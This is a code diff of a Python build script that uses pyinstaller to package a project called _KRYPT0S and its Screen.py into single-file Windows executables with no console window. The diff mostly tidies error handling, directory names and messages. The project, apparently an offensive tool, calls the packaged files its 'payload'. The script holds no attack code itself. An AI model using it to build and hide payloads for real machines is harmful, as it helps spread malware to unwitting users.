@@ -4,9 +4,10 @@
 #  CREATED BY PHANTOM0004 (All rights reserved)
 #  Check out my penetration testing repo! -> https://github.com/phantom0004/PenTest_Vault
 # ========================================================================================
-# This is the setup tool for _KRYTP0S, will make all .py files to .exe files for windows
+# This is the setup tool for _KRYPT0S, will convert all .py files to .exe files for Windows
 # ========================================================================================
-import subprocess, os 
+import subprocess
+import os
 import shutil
 
 def parse_pip_output(pip_output, library_name):
@@ -26,11 +27,10 @@ def check_os():
         print("Converting a .py to a .exe file from a non-Windows OS will result in creating an executable for that system.")
         print("This is not a script limitation but a general limitation found in all conversion systems.")
         print("To run this successfully, ensure the OS you are running this script on is a Windows machine.")
-        print("This will ensure the conversion will work and the .py file will change to a .exe file.")
         
         exit()
         
-    print(f"[\u2714] You are running script on a Windows OS \n")
+    print(f"[\u2714] You are running the script on a Windows OS \n")
     
 def download_library(libraries):
     print("[*] Checking and downloading required PIP libraries")
@@ -38,11 +38,8 @@ def download_library(libraries):
         command = ["pip", "install", library]
         try:
             result = subprocess.run(command, capture_output=True, text=True)
-            if result.stdout or result.stderr: 
-                output = parse_pip_output(result.stdout, library)
-                print(output)
-            else:
-                print(f"No output available for {library}.")
+            output = result.stdout + result.stderr
+            print(parse_pip_output(output, library))
         except Exception as err:
             print(f"[-] Unable to install {library}! Error: {err}. Skipping...")
             
@@ -56,46 +53,46 @@ def libraries_check_section():
 def payload_conversion():
     names = ["_KRYPT0S.py", "Screen.py"]
     
-    try:
-        os.mkdir("krytp0s output conversion")
-    except FileExistsError:
-        pass
-    except:
-        exit("Error when creating output file. Please create a file named 'krytp0s output conversion' manually in the same directory to bypass this problem.")
+    output_dir = "krypt0s_output_conversion"
+    if not os.path.exists(output_dir):
+        try:
+            os.mkdir(output_dir)
+        except Exception as e:
+            exit(f"Error when creating output directory. Please create a directory named '{output_dir}' manually in the same directory to bypass this problem. Error: {e}")
     
     try:
-        os.chdir("krytp0s output conversion")
-    except FileNotFoundError:
-        exit("Unable to find 'krytp0s output conversion' folder, ensure it has been created and is found in this directory before continuing.")
+        os.chdir(output_dir)
     except Exception as err:
-        exit(f"An unknown system error occured when trying to traverse a path : {err}")
+        exit(f"Unable to change to '{output_dir}' directory. Ensure it has been created and is found in this directory before continuing. Error: {err}")
     
-    file_name = "KRYPT0S" # Default name
-    file_name = input("Enter a custom name for the executable file of _KRYPT0S.py -> ")
-    if ".exe" in file_name: file_name = file_name.rstrip('.exe')
+    file_name = input("Enter a custom name for the executable file of _KRYPT0S.py (without .exe) -> ").strip()
+    if not file_name:
+        file_name = "KRYPT0S"
         
     for name in names:
-        if name == "Screen.py": file_name = "Screen"
+        current_file_name = file_name if name == "_KRYPT0S.py" else "Screen"
         command = [
             "pyinstaller",
             "--onefile",
             "--name",
-            file_name,
+            current_file_name,
             "--noconsole",
-            f"../_KRYPT0S_f1les/{name}"
+            f"../{name}"
         ]
 
-        print(f"\n[!] Processing the conversion of '{file_name}'. Please stand by, this may take some time.")
+        print(f"\n[!] Processing the conversion of '{current_file_name}'. Please stand by, this may take some time.")
         result = subprocess.run(command, capture_output=True, text=True, shell=True)
     
         if result.returncode == 0:
-            print(f"[+] File {name} has been converted to {file_name}.exe.")
+            print(f"[+] File {name} has been converted to {current_file_name}.exe.")
         else:
-            exit(f"[-] A fatal error occurred: {result.stderr}. If this issue persists, try re-installing 'pyinstaller")
+            print(f"[-] A fatal error occurred, below is the error log: \n\n{result.stderr}\n")
+            print("Tips to fix this issue :\n[1] Ensure the .py files are NOT inside a custom folder, if so put them outside\n[2] Reinstall 'pyinstaller' with PIP if the issue persists")
+            exit("\nIf the issue is still not fixed open an issue on _KRYPT0S repo for further evaluation.\nAlternitivley manually convert the files with 'pyinstaller' tool!")
         
-        clean_pyinstaller_artifacts(file_name)
+        clean_pyinstaller_artifacts(current_file_name)
         
-    print("\n[*] Conversion Completed. Please check the 'krytp0s output conversion' folder to view the output")
+    print("\n[*] Conversion Completed. Please check the 'krypt0s_output_conversion' folder to view the output")
 
 def clean_pyinstaller_artifacts(executable_name):
     # Define paths
@@ -110,36 +107,36 @@ def clean_pyinstaller_artifacts(executable_name):
     if os.path.exists(build_dir):
         try:
             shutil.rmtree(build_dir)
-        except:
-            print(f"Unable to delete the following directory : {build_dir}")
+        except Exception as e:
+            print(f"Unable to delete the following directory: {build_dir}. Error: {e}")
     
     # Delete __pycache__ directory
     if os.path.exists(pycache_dir):
         try:
             shutil.rmtree(pycache_dir)
-        except:
-            print(f"Unable to delete the following directory : {pycache_dir}")
+        except Exception as e:
+            print(f"Unable to delete the following directory: {pycache_dir}. Error: {e}")
     
     # Delete the spec file
     if os.path.exists(spec_file):
         try:
             os.remove(spec_file)
-        except:
-            print(f"Unable to delete the following directory : {spec_file}")
+        except Exception as e:
+            print(f"Unable to delete the following file: {spec_file}. Error: {e}")
     
     # Move the executable to the current directory
     if os.path.exists(executable_path):
         try:
             shutil.move(executable_path, new_executable_path)
-        except:
-            print(f"Unable to move executable file {executable_name} to : {new_executable_path}")
+        except Exception as e:
+            print(f"Unable to move executable file {executable_name} to: {new_executable_path}. Error: {e}")
     
     # Delete dist directory
     if os.path.exists(dist_dir):
         try:        
             shutil.rmtree(dist_dir)
-        except:
-            print(f"Unable to delete the following directory : {dist_dir}")
+        except Exception as e:
+            print(f"Unable to delete the following directory: {dist_dir}. Error: {e}")
     
     print(f"[*] Cleanup completed for {executable_name}")
     print() # New line
